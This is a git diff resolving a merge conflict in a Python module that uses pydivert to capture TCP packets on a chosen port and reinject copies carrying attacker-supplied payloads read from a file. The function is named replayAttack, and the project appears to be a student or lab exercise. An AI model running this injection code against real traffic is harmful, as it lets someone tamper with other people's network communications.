@@ -1,8 +1,3 @@
-<<<<<<< HEAD
-import  pydivert
-from sniff import *
-"Kopiranje uhvacenog paketa"
-=======
 import pydivert
 
 import threadManagement
@@ -11,7 +6,6 @@ from sniff import *
 "Kopiranje uhvacenog paketa"
 
 
->>>>>>> origin/moco
 def copy_packet(original_packet):
     new_packet = pydivert.Packet(raw=original_packet.raw,
                                  direction=original_packet.direction,
@@ -20,16 +14,6 @@ def copy_packet(original_packet):
     new_packet.dst_addr = original_packet.dst_addr
     new_packet.src_port = original_packet.src_port
     new_packet.dst_port = original_packet.dst_port
-<<<<<<< HEAD
-    #new_packet.protocol = original_packet.protocol
-    return new_packet
-
-def replayAttack(sourcePort,file):
-    counter = 0
-    with pydivert.WinDivert(f"tcp.DstPort == {sourcePort} and tcp.PayloadLength == 11") as w:
-        for packet in w:
-            attackMessages = file[counter] # vadim poruke za napad
-=======
     # new_packet.protocol = original_packet.protocol
     return new_packet
 
@@ -39,7 +23,6 @@ def replayAttack(sourcePort, file):
     with pydivert.WinDivert(f"tcp.DstPort == {sourcePort} and tcp.PayloadLength == 11") as w:
         for packet in w:
             attackMessages = file[counter]  # vadim poruke za napad
->>>>>>> origin/moco
             print(f"Attack message from file:{attackMessages}")
             print(f"Message from packet {packet.payload}")
             if counter%5 != 0:
@@ -47,12 +30,6 @@ def replayAttack(sourcePort, file):
                 paketCopy = copy_packet(packet)
                 paketCopy.payload = attackMessages
                 w.send(paketCopy)
-<<<<<<< HEAD
-                counter += 1
-            else:
-                w.send(packet) #svaki peti ce se slati originalni
-                counter+=1
-=======
             else:
                 w.send(packet)  # svaki peti ce se slati originalni
             counter += 1
@@ -61,4 +38,3 @@ def replayAttack(sourcePort, file):
             with threadManagement.ThreadManagement.replayLock:
                 if threadManagement.ThreadManagement.stopReplay == True:
                     return
->>>>>>> origin/moco
